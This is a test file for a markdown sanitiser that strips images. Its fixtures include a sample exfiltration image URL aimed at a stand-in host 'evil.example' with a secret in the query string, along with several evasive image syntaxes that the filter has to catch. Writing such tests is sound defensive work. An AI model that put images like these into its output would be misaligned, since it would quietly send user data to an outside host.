import { describe, expect, it } from "vitest";
import { renderMarkdown } from "./remarkRenderer.ts";
import { withoutImages } from "./stripImages.ts";

describe("withoutImages", () => {
  it("takes every image out and leaves what it was called", () => {
    const html = renderMarkdown(
      "Total: 3 ![chart](https://evil.example/c.png?d=secret) done",
    );
    expect(html).toContain("<img");
    const stripped = withoutImages(html);
    expect(stripped).not.toContain("<img");
    expect(stripped).not.toContain("evil.example");
    expect(stripped).toContain("Total: 3 chart done");
  });

  it("catches an image however it was written", () => {
    const written = [
      "![][ref]\n\n[ref]: https://evil.example/a.png",
      '<img src="https://evil.example/b.png">',
      "<IMG SRC=https://evil.example/c.png alt='a > b'>",
      "[![x](https://evil.example/d.png)](https://example.com)",
      '<input type="image" src="https://evil.example/e.png">',
    ];
    for (const markdown of written) {
      const stripped = withoutImages(renderMarkdown(markdown));
      // Read as a browser would read it: nothing is left that loads by itself.
      // (A link can still name the address. It goes nowhere until a person
      // follows it.)
      const drawn = document.createElement("template");
      drawn.innerHTML = stripped;
      expect(drawn.content.querySelectorAll("img"), markdown).toHaveLength(0);
      expect(drawn.content.querySelectorAll("[src]"), markdown).toHaveLength(0);
    }
  });

  it("leaves links and everything else as they were", () => {
    const html = renderMarkdown("**bold** and [a link](https://example.com)");
    expect(withoutImages(html)).toBe(html);
  });
});
